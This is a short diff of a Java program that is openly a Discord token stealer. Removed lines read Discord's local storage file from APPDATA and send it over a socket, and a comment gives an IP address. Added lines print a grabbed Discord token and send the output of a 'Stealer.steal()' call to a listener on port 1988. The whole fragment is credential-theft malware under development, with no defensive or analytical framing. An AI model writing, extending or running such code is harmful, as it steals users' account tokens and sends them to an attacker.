@@ -7,11 +7,9 @@ import java.io.*;
 public class Main {
     public static void main(String[] b) {
         try {
-            File file = new File(System.getenv("APPDATA") + "/discord/Local Storage/https_discordapp.com_0.localstorage.other");
 
-            Socketeer socketeer = new Socketeer("localhost", 1988); //107.174.70.186
-
-            socketeer.f(file);
+            System.out.println(Discord.getToken());
+            Socketeer socketeer = new Socketeer("localhost", 1988); //107.174.70.18
 
             socketeer.h(Stealer.steal());
 
